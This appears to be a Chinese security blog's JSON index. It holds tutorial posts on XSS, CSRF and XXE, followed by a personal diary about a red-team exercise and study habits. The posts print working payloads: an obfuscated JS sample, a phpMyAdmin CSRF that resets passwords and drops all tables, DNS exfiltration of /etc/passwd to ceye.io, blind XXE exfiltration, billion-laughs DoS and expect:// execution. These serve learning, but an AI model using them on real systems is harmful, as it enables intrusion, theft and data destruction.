[&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 9. XSS练习1.prompt(1) to win 2.alert(1) to win 3.先知社区xss挑战 10. XSS平台BeEFXSS Exploit 框架 XenotixBlueLotusXSS_PlatformXSSerXSSpt11. 参考[1] 浅谈跨站脚本攻击与防御 [2] 跨站的艺术-XSS入门与介绍 [3] aaencode demo [4] http://www.jsfuck.com","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/categories/OWASP-TOP10/"}],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'Cross-Domain'","slug":"Cross-Domain","date":"2019-05-09T11:28:36.000Z","updated":"2019-05-11T03:24:07.657Z","comments":true,"path":"2019/05/09/Cross-Domain/","link":"","permalink":"https://chirec.github.io/2019/05/09/Cross-Domain/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"'CSRF'","slug":"CSRF","date":"2019-05-09T11:27:33.000Z","updated":"2019-05-14T03:34:31.705Z","comments":true,"path":"2019/05/09/CSRF/","link":"","permalink":"https://chirec.github.io/2019/05/09/CSRF/","excerpt":"CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。","text":"CSRF（Cross Site Request Forgery, 跨站请求伪造）是一种网络的攻击方式，也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF。CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。 条件1.正常用户需要登录站点2.攻击者需要知道站点请求内容(构造恶意请求)3.需要正常用户在登录成功的浏览器中诱导点击恶意链接4.服务器无验证或验证不严谨 自动提交12setTimeout(&quot;document.form.submit&quot;,1000)编写脚本，包含document.form.submit 复现phpmyadmin 4.7.x CSRF漏洞 修改密码1234set password=password(&apos;&apos;)http://192.168.11.200/phpMyAdmin-4.7.4/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password%20=%20PASSWORD(%27123%27)&lt;p&gt;hello world&lt;/p&gt;&lt;img src=&quot;http://192.168.11.200/phpMyAdmin-4.7.4/sql.php?db=mysql&amp;table=user&amp;sql_query=SET%20password%20=%20PASSWORD(%27123%27)&quot; style=&quot;display: none;&quot;&gt; 写文件12show variables like &apos;%secure_file_priv%&apos;;select &quot;&quot; into outfile &apos;/var/&apos;; 读文件12select load_file();select load_file(concat(&apos;\\\\\\\\&apos;,(select load_file(&apos;/etc/passwd&apos;)),&apos;.mysql.jjj.ceye.io\\\\abc&apos;)); 需要使用OOB 删库完整SQL语句 123456789101112DROP PROCEDURE IF EXISTS EMPT;DELIMITER $$ CREATE PROCEDURE EMPT() BEGIN DECLARE i INT; SET i = 0; WHILE i &lt; 100 DO SET @del = (SELECT CONCAT(&apos;DELETE FROM &apos;,TABLE_SCHEMA,&apos;.&apos;,TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE &apos;%_schema&apos; and TABLE_SCHEMA!=&apos;mysql&apos; LIMIT i,1); PREPARE STMT FROM @del; EXECUTE STMT; SET i = i +1; END WHILE; END $$DELIMITER ;CALL EMPT(); POC 1DROP+PROCEDURE+IF+EXISTS+EMPT%3B%0ADELIMITER+%24%24%0A++++CREATE+PROCEDURE+EMPT%28%29%0A++++BEGIN%0A++++++++DECLARE+i+INT%3B%0A++++++++SET+i+%3D+0%3B%0A++++++++WHILE+i+%3C+100+DO%0A++++++++++++SET+%40del+%3D+%28SELECT+CONCAT%28%27DELETE+FROM+%27%2CTABLE_SCHEMA%2C%27.%27%2CTABLE_NAME%29+FROM+information_schema.TABLES+WHERE+TABLE_SCHEMA+NOT+LIKE+%27%25_schema%27+and+TABLE_SCHEMA%21%3D%27mysql%27+LIMIT+i%2C1%29%3B%0A++++++++++++PREPARE+STMT+FROM+%40del%3B%0A++++++++++++EXECUTE+stmt%3B%0A++++++++++++SET+i+%3D+i+%2B1%3B%0A++++++++END+WHILE%3B%0A++++END+%24%24%0ADELIMITER+%3B%0A%0ACALL+EMPT%28%29%3B%0A CSRF高危触发点论坛交流用户中心反馈留言交易管理后台管理 CSRF漏洞危害CSRF漏洞会导致受害人在不知情的情况下向论坛发帖子、订阅邮件列表、网购或股票交易，或变更用户名或口令。对受到防火墙保护的所有web应用程序而言，CSRF攻击都能绕过防火墙攻击web应用。CSRF漏洞还可以和XSS等漏洞结合使用，从而进一步加大了该漏洞的危害。CSRF+XXECSRF+LFICSRF+XSS 伪造HTTP请求进行未授权操作篡改、盗取目标网站上的重要用户数据未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等如果通过使用社工等方式攻击网站管理员，会危害网站本身的安全性 作为其他攻击向量的辅助攻击手法，比如配合XSS 传播CSRF蠕虫 CSRF防御1.Referrer验证2. Token验证3. 用户身份验证绑定邮箱、手机验证码","categories":[],"tags":[]},{"title":"'XXE'","slug":"XXE","date":"2019-05-09T11:21:39.000Z","updated":"2019-07-04T11:26:31.306Z","comments":true,"path":"2019/05/09/XXE/","link":"","permalink":"https://chirec.github.io/2019/05/09/XXE/","excerpt":"XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。","text":"XML外部实体攻击是一种应用层攻击，攻击的前提是应用能够解析XML。XXE发生的场景通常是用户在XML输入中包含了外部实体引用，且该外部实体也能被错误配置的XML解析器解析。从解析器所在的主机角度来看，这种攻击可能会引起机密信息泄漏、拒绝服务攻击、服务器请求伪造、端口扫描和其他系统影响。 1. XML基础1.1 XML结构XML由3部分构成，XML声明，文档定义(Document Type Definition,DTD)，文档元素。 1234567891011121314151617&lt;!--XML申明--&gt;&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT head (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Windy&lt;/to&gt;&lt;from&gt;Andy&lt;/from&gt;&lt;head&gt;Greeting&lt;/head&gt;&lt;body&gt;Long time no see!&lt;/body&gt;&lt;/note&gt; 1.2 DTD1.2.1 DTD文档形式1.2.1.1 内部DTD文档1&lt;!DOCTYPE 根元素 [定义内容]&gt; 1.2.1.2 外部DTD文档1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt; 1.2.1.3 混合类型1&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt; 1.2.2 实体类别1.2.2.1 内部普通实体1&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt; 1.2.2.2 外部普通实体1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot; 1.2.2.3 内部参数实体1&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt; 1.2.2.4 外部参数实体1&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 1.2.2 Example1234567&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt; &lt;data&gt;&amp;data;&lt;/data&gt;&lt;/root&gt; 普通实体使用&amp;实体名;来进行引用；参数实体只能在定义种出现。 2. 漏洞利用2.1 读取任意文件2.1.1 探测XXE漏洞以bWAPP的XXE漏洞为例 抓包发现，返回数据格式是xml格式 Payload 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY data SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;data;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 2.2 URL请求2.2.1 Blind XXE在某些情况下，即使存在XXE漏洞，服务器并不会将数据回显。这种情况下，使用外带数据(Out Of Band, OOB)依然可以获得数据。 test.php 模拟具有XXE漏洞的站点，搭建在靶机上 123456&lt;?php $xml = $_POST['xml']; $data = @simplexml_load_string($xml); echo \"&lt;pre&gt;\"; @print_r($data);?&gt; XXE_OOB.php 用来接收带外数据的页面，由攻击者搭建 123456&lt;?php $xxe = $_GET['xxe']; $log = fopen('xxe.txt','a+'); fwrite($log,$xxe); fclose($log);?&gt; evil.dtd 恶意DTD，由攻击者构造 1&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost:8000/Blind_XXE/XXE_OOB.php?xxe=%file;&apos;&gt;&quot;&gt;%all; test.txt 用来存放带外数据的文本文档 1hello! payload 恶意请求 1234567xml=&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE ANY[ &lt;!ENTITY % remote SYSTEM &quot;http://localhost:8000/Blind_XXE/evil.dtd&quot;&gt; &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=d:/test.txt&quot;&gt; %remote; %send; ]&gt; 访问test.php，将payload用post方式传入。调用外部DTD文档evil.dtd，访问XXE_OOB.php，将数据写入xxe.txt文档中。也可以查看access.log获取数据。 数据aGVsbG8h经过Base64编码，解码后为hello! 2.2.2 内网探测2.2.2.1 端口扫描12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ipconfig [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.126.1&quot;&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;xxe;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt; 2.3 DOS拒绝服务递归调用，占用大量服务器资源 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE DOS [&lt;!ENTITY DOS0 &quot;DOS&quot;&gt;&lt;!ENTITY DOS1 &quot;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&amp;DOS0;&quot;&gt;&lt;!ENTITY DOS2 &quot;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&amp;DOS1;&quot;&gt;&lt;!ENTITY DOS3 &quot;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&amp;DOS2;&quot;&gt;&lt;!ENTITY DOS4 &quot;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&amp;DOS3;&quot;&gt;&lt;!ENTITY DOS5 &quot;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&amp;DOS4;&quot;&gt;&lt;!ENTITY DOS6 &quot;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&amp;DOS5;&quot;&gt;&lt;!ENTITY DOS7 &quot;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&amp;DOS6;&quot;&gt;&lt;!ENTITY DOS8 &quot;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&amp;DOS7;&quot;&gt;&lt;!ENTITY DOS9 &quot;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&amp;DOS8;&quot;&gt;]&gt;&lt;DOS&gt;&amp;DOS9;&lt;/DOS&gt; 2.4 远程代码执行当目标服务器安装了PHP expect模块，并且加载了该模块时，可以使用expect执行系统命令。 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ipconfig [&lt;!ENTITY xxe SYSTEM &quot;expect://ifconfig&quot;&gt;]&gt;&lt;ipconfig&gt;&amp;xxe;&lt;/ipconfig&gt; 3. XXE防御 The main problem is that the XML parser parses the untrusted data sent by the user. However, it may not be easy or possible to validate only data present within the system identifier in the DTD. Most XML parsers are vulnerable to XML external entity attacks (XXE) by default. Therefore, the best solution would be to configure the XML processor to use a local static DTD and disallow any declared DTD included in the XML document. From:HUNTING IN THE DARK - BLIND XXE XXE的主要问题是XML解析器解析了用户发送的不可信数据。然而，在DTD文档中验证带有系统标识符的数据并不现实。默认情况下，大多数XML解析器都容易遭受XXE攻击。所以，最好的解决办法是配置XML处理器仅使用本地静态DTD，同时禁止XML文档中的DTD声明。 4. 参考[1] XML外部实体（XXE）注入详解 [2] XXE攻击指南 [3] 浅谈XXE漏洞攻击与防御 [4] 黑夜的猎杀-盲打XXE [5] HUNTING IN THE DARK - BLIND XXE [6] XXE漏洞利用技巧：从XML到远程代码执行","categories":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/categories/OWASP-TOP10/"}],"tags":[{"name":"OWASP-TOP10","slug":"OWASP-TOP10","permalink":"https://chirec.github.io/tags/OWASP-TOP10/"}]},{"title":"'Diary'","slug":"Will-i","date":"2019-05-09T07:22:40.000Z","updated":"2019-07-06T12:23:34.731Z","comments":true,"path":"2019/05/09/Will-i/","link":"","permalink":"https://chirec.github.io/2019/05/09/Will-i/","excerpt":"希望能通过日记来督促自己改掉一些坏习惯。","text":"希望能通过日记来督促自己改掉一些坏习惯。 2019-052019-05-28今天开始写日记(流水账)。 最近等着去护网，没有心思学习。前几天每天下午都睡到3点起床，晚上又睡不着，继续回到以前中午只睡30分钟的作息。 除了睡觉时间过多，最近没有怎么学习，Python看教程看到编写POC之后，就不想继续看了，不想思考怎么写POC，不想动手写代码，懒啊！ 最近没有明确的学习目标，想学习内网渗透，但不知道怎么去开始学。看Micropoor亮神的课程，发现有点难看懂，大概是太菜了。这几天看的东西很杂，不过多数是有关安全应急响应的内容，还有关于护网演习的东西。希望护网期间能继续学习，6月把内网看完之后，照着招聘要求的内容，再梳理一遍，然后开始投简历。想到工作要认识新的人就头大。 昨天看微博，一个女生在大街上被男的拿刀砍死了，可怕。男的目标很明确，三个女生在一起走，就砍那一个，砍倒就跑了，不知道是不是有什么恩怨。 微博真的有毒，刷了就停不下来，已经删了App，不知道什么时候会再装回来。 今天看了如何合理利用时间？，学会了一句话The future is uncertain, the past is certain, only the present is guaranteed. 今天看了Windows安全应急响应，明天把Linux的安全应急响应看完。 今天看了2节时间管理，试试看这周能不能看完，然后总结出来写到Blog上。 思考如何明确学习目标。 2019-05-29今天把安全响应的总结写了一半，明天应该就能写完了。 想剩下的2天把《态度》看完，也算完成每月一本书的目标了。 昨天那个南昌红谷滩砍人说是男的被绿了，然后把女的砍死了。微博上性别对立好像很严重。 今天还是会看些和学习无关的东西，直播、微博什么的，最近总是不能集中精力。 护网又推到10号了，本来护完网之后还能休息一周，现在没了，烦。 昨天看时间管理，我可能没有把每天的目标量化，所以才不想去完成？ 今年刚开始的时候，就觉得自己之前一直没有关心过周围的人，不论是家人还是朋友。跟很多朋友都是很久不联系，然后就彻底断了联系。也不是不想联系，就是不知道要说什么，没有什么共同话题，我的休闲活动就只是单机游戏，他们又不怎么玩单机游戏。弟弟玩WOW和Dota2，但我已经很久没玩过了。春节在一起的时候，聊得也不是很多。今天听父亲说，他去一个房地产公司当策划了，很久没和他主动联系过了，自从不玩一个游戏之后。不过上次微信上聊天，感觉他过得好像还是很轻松的样子，春节看他和朋友打游戏还是蛮欢乐的。 今天注册了漏洞盒子的账号，发现挖漏洞还要递交申请。想要刷一刷SRC，拿个站，在面试的时候也好说一些，而且没有实战很多东西还是不能理解透彻。上次做一个靶场，知道是MSSQL注入漏洞，但是已经把MSSQL的注入姿势忘得差不多了，之前的内容需要再复习一遍了，SQLi Lab也没做完，按理说早就应该开始做了，Upload Lab也是，Python的学习也停下来了。既然这样，6月份的目标就是把这2个Lab做完，Python继续学习，达到能够看着Vulhub的介绍信手拈来写出POC。 2019-05-30昨天看到MONSTER HUNTER: WORLD里太刀的新动作——居合，太帅了，吃我纷乱雪月花！！居合的时候还有见切成功的音效”叮”，居合之后接登龙，帅爆。PC还是不和PS4同步上线，好气，要等到冬天才能玩上。预购冰原送的结云套，比之前的豪华版盔甲好看很多。 FF14前几天更新了4.5，还打电话叫我光之战士，然后就被我标记骚扰电话了。出了新职业青魔法师，在4.5开放一周之后实装。现在可以在金蝶里打日麻了，游戏里叫多玛方城战。过年的时候为了先了解一下日麻，还玩了段时间的雀魂。FF14做的真的很不错，我这种自闭单机玩家也能玩得很舒服，对装备的需求不像WOW那么大，也没有野外PVP，玩家氛围大部分时间都很友好。游戏剧情也有很出彩的地方，整个剧情里印象最深的就是3.0，奥尔什方在玩家最落魄的时候，提供了帮助，为了纪念他，我把我的陆行鸟改名奥尔什方。 游戏真的很容易上瘾，特别是现在移动端手机游戏玩起来更方便了。有个舍友，玩王者荣耀每天都玩到晚上两三点，然后白天也在宿舍里呆着玩游戏。仿佛看到了曾经的我自己。但游戏还是教会我很多东西，不要轻易放弃，即使被Boss打死100次，再次站起来之后，还是要去挑战。黑魂3里的英雄古达，我从凌晨2点打到7点，分析AI的出手规则，才打过去。 不过，不能把做正事的时间花在游戏上面。最近看的《态度》里，吴军在写给女儿的信中也谈到了电子游戏。希望自己的女儿能够通过设立长远目标摆脱玩电子游戏的欲望，用平和的心态，日积月累圆满的实现目标。 长远的目标。希望我也能摆脱玩电子游戏的欲望，还有其他的欲望。 打算两天看完《态度》，记录一些书里的内容。 1.生活是具体的，看待问题要将问题的具体数据拿出来比对，量化；动态地看待问题。在德国人处事态度上，提到了量化目标。 2.追求极致 3.简单的事情也要做到最好 4.稳定发挥 5.培养专业素养 6.遇事不要逃避，想想是否有比逃避更好的方法，解决问题，哪怕只是一部分问题 7.格局要大，境界要高 今天看了《态度》的37/40，读的过程真的是很流畅，书里讲了很多为人处世的道理，爱情、工作、学业、人生目标都有涉及。 不过吴军似乎信仰上帝，感觉很奇怪。 2019-05-31早上把《态度》剩下的3/40看完了，记了点东西 和公司的每一个人吃一顿午饭，可以建立广泛的人脉关系，在未来的职业发展道路上。跟我昨天晚上看果壳上泛关系的文章讲得差不多，不过是2个都是以美国为背景讲的，不知道在中国的情况是怎样的。 本来希望能看到有和朋友保持联系的内容，不过并没有。只是有一篇讲怎么和朋友相处：不要怕吃小亏。 可能都是一些比较常见的道理，看豆瓣书评的时候，有人觉得收获不多，不过我感觉还可以。 从书里看出吴军确实是个格局很大的人，对哈佛，MIT的学生的期望是他们做有影响力的工作，而不只是做高薪工作，对少数裔，也是希望他们能够从政治的层面考虑，做些能够为少数裔争取权利的事情。我就根本不会去考虑政治层面的东西。 从早上在京东看着买书，看了3个小时，发现技术类的书都好贵，轻轻松松上60，小说类的才30多。6本书买了放在哪里是个问题，换地方住的时候也好麻烦。 晚上看了部电影《最后的武士》，到死都不放弃。 意志消沉该怎么办？ 1.分块(CHUNKING)，将大目标细分为小任务 2.提升信心，相信自己可以完成目标 3.改变对意志力的看法，相信意志力是无限的，意志力的消耗速度会降低 4.改变身份，将自己的身份和自己的目标相匹配，会降低意志力的消耗， 5.高层次思考，长期，总体的思考方式，高层次思考创造了目标和意义 将意志力看做蓝量，分块就是合理划分技能使用，爆发期爆发，转阶段时节省蓝量；高层次思考，是将整个Raid看为整体，才能将技能划分的更合理。 五月的最后一天，这个月的状态并不好，对CSRF、XXS、XXE、SSRF的理解并不是很深，再加上护网的原因，没有学习环境，大概10天都没有认真学习。 六月不能这样了！2019马上就要过去一半了。 六月的目标： 1.学习内网渗透 2.复习之前学习的内容 3.学习Python，今天买了本Python的书，可以参考着学习 4.看《图解TCP/IP》和《图解HTTP》，学习一下网络基础知识 2019-062019-06-01看微博的时候学到的。 有意识地克制自己，去做好信息的反刍，而非追逐新的信息。 思考旧的信息间的联系，把它们进行碰撞和链接，尝试着用不同的角度思考，找出共性和新的主题 —— 这是一个很有意思的事情。 它可以优化你的信息处理模式：从新鲜感导向的获取-囤积，到成就感导向的反刍-输出。你会更容易觉察到自己的状态，摆脱被新鲜刺激所裹挟的上瘾状态。 看朋友圈学到的，睡前和起来之后看一篇技术文章，正好可以催眠和利用赖床的时间。 如何克服内心的空虚感？ 空虚感永远不会消失，但是通过做某些事情，可以让空虚感变小 1.把时间和精力专注于提升自己，健身，学习营养学，培养良好的睡眠习惯 2.创造新东西，艺术、音乐、写作、跳舞、编程，当创造新东西时，注意力将不再在自己的空虚感上，而在身体之外的某个事物上。和其他(酒精、游戏、看剧)打消空虚感的东西不一样，创造的东西在第二天不会消失 3.冥想，坐下，观察自己的身体，而无需做任何其他的事，直面空虚感 2019-06-02昨天看采铜的《精进：如何成为一个很厉害的人》，发现最近看的一些文章和书里都有提到，长期目标，量化可执行的目标。 长期目标可以设立5年目标，那么我应该设立一个什么目标呢？最近一直在思考这个问题，但并没有想出答案来。我其实也不知道自己想成为一个什么样的人。 如何走出自卑的牢笼？ 1.照顾好自己，好的生活习惯，好的生活环境 2.开始冥想，又要冥想，这个视频作者是有多喜欢冥想。冥想会提供多种处理思想的方法，如何意识自己的想法，如何重构消极想法，可以创造自己的想法。冥想自己想要的模样，多次之后就会相信自己就是这样，这个想法必须是现实中可以实现的。当给自己积极的评价时，会变得自信。 都是积极的心理暗示，跟果壳的这篇文章有点像假装优秀又怎样？那些年我吹过的牛，后来都成真了，Fake it till you make it。 我发现，我对那种根本不知道的知识，学起来有点抗拒，看各种代理的时候，就根本不想仔细看，直接跳过去了，这样不好。 在过了可能5年之后，我又开始学习冥想。好难，根本不知道怎么冥想。之前，是清空杂念，什么都不想，当时就只数数字，早上看完视频之后，发现，冥想可以和自己的负面想法对话。然后看了一篇冥想的教程，还可以观察自己的思想。 重点是克服杂念！保持平和的心态！ 2019-06-03冥想好难！ 今天看微博频繁出现414，百度了一下，发现是因为IP频繁访问微博，微博对IP进行访问限制，我好像找到了戒掉微博的方法？写个爬虫去疯狂爬微博，然后关掉了手机的WIFI连接，打开了微博国际版。 好像是Next的问题，当标题数量达到一个数量之后，Table of Contents就会显示异常，烦，不知道怎么改掉这个bug。下午给标题换了个地方就好了，不知道触发条件到底是什么。 今天用dns隧道的时候，看教程ruby的镜像选择http://ruby.taobao.org，然后报404，直接访问链接，提示镜像换到了https://gems.ruby-china.org/，然后访问，又提示域名更换成了https://gems.ruby-china.com，真是醉了。 2019-06-04今天开始护网，地铁人真的是多，根本挤不上去。 到了客户那里，感觉虚得不行，压力好大。 还没订住宿的地方，来回要花3个小时。 回来的时候，滴滴司机人还不错，聊了一路。 跟母亲打电话，听到工作12小时，有点不乐意。 希望早点把酒店订下来，不用来回跑了。 2019-06-05今天带了电脑，测了一下昨天看到的xml格式的请求内容，确实存在XXE，而且还是15年的漏洞。 聊了些渗透测试工作的事，和我想得并不一样，getshell才算是漏洞。 2019-06-06就处理了一个钓鱼邮件的单子 今天看完了Nmap的官方文档 端午放假2天，酒店订的9号的，还要拉着行李去客户那里，真是服了 2019-06-07昨天看采铜的书，觉得应该给自己设定最高的要求，从高中开始，对学习的要求就不高，对于难题就不去做，给自己定了个80%的天花板，然后就只能做到75%，也算是自我设限了。自己对很难的事情总是不愿去做，即使玩游戏也会不自主的逃避最困难的关卡。 今天看知乎学到了一个渗透开源CMS的思路，判断版本，识别插件，匹配公开漏洞，针对目标的爆破，子域名，C段，旁站，whois查询，通过webbug发邮件探针，上马或者水坑 2019-06-08昨天和今天看完了《Web安全攻防：渗透测试实战指南》感觉这本书对Web漏洞的讲解很基础，在内网阶段讲得感觉很细，不过也只是讲了一下MSF POWERSHELL工具的使用，后面实例讲的代码审计分析漏洞，基本都是很基础的内容，没有更深层次的内容。 2019-06-09今天学到一个词“打野式学习”蛮符合我现在学习状态的。没事就看看文章。这种碎片化学习感觉需要整理才能真正的融入自己的知识体系里，不过好像看书也需要整理。 今天问了一下面试，准备结束之后去面试。上来就面这种难度的公司感觉不是很好，为此找出了在硬盘里躺了2个月的github面试经验，又看了一下github上还是有很多我没下载的面试经验，可以考虑这段时间总结出来，正好自己也需要准备面试。 2019-06-10昨天骑车回来的时候，在玉泉路看到了2棵很粗的银杏树，小时候在奶奶家院子里种的银杏树可能只有半米高，在西电见到的银杏树虽然很高，但是依然很细。昨天看到那么粗的银杏树，真的很惊讶。今天查了一下，这2棵树还挺出名，改天去照张照片留念。还想去看看北京最粗的银杏树有多粗。 今天看到一个木马，访问下载页面，是被美国什么组织封禁的告示，但后来看流量日志发现木马仍然和该域名进行通信，看事情不能只看表面。 2019-06-11今天看别人封了300多个C段，700多个C段，真的狠。这几天看各种日志，感觉渗透就是在被别人的安全设备一直盯着，干什么都会被记录下来。而且，听到2次渗透测试需要运气，有些迷茫。 2019-06-12昨天看了个文章HW碰到0708扫描的，然后附件有查杀0708漏洞的工具，今早看了下群里说附件有毒，套路深啊！ 2019-06-13打电话联系人的时候，被叫X工，希望有一天能到这种级别吧。 已经开始社工和用之前的后门了，可能真的需要运气吧。 2019-06-14已经开始使用0day了，并且开始使用钓鱼邮件，感觉渗透面对这种级别的防护，好像没有什么办法。 最近没看什么书，浪费生命。昨天看见四哥的微博，讲了他学英语的经历，真的好强，坚持1000多天都没断。明天开始每天背50个单词。 2019-06-15早上起来跳绳，但是状态并不好，没有一组跳到500个，不过也没有其他时间能跳绳了。 2019-06-16最近喜欢喝巧克力牛奶，加糖的那种，太堕落了。 趁着今天阴天凉快，去照了银杏树的照片，走近了看，发现有一棵好像断了一次，另一棵也不是很高，跟周围的银杏比起来并不算特别高，不过是真的粗。 看知乎，好像西安有棵网红银杏树，不知道什么时候有时间去看看。 算起来已经3个0day出现了，深信服vpn，coremail，还有weblogic。昨天晚上还看了下weblogic的poc，并看不懂，对于负数的值也不知道是什么意思。 又出来个Apache Axis的0day… 今天看采铜的书，学到一个图层化工作法，将多种工作按核心分类，将多个相同类型的核心的部分放在一起进行处理。可以减少切换类型时，大脑的转换时间。大概就是FF14做任务，先把T职责的任务做完，再做DPS的任务，再做奶的任务。T的任务处理过程和DPS、奶的处理过程不同，如果不断的切换，需要不断的熟悉各个职责的处理过程。 2019-06-17舍友去面试了，感觉面试内容很多，而且问到很多细节问题，甚至问到了安卓渗透，要多准备一下了。 今天又有钓鱼邮件，而且还通过微信公众号进行社工，不知道是怎么推送到公众号上的。附件和上次的内容一样，不过回连IP地址发生变化。 2019-06-18今天，看了一个简单的冥想教程，感觉自己学会了冥想！ 冥想的具体做法是怎样的？ 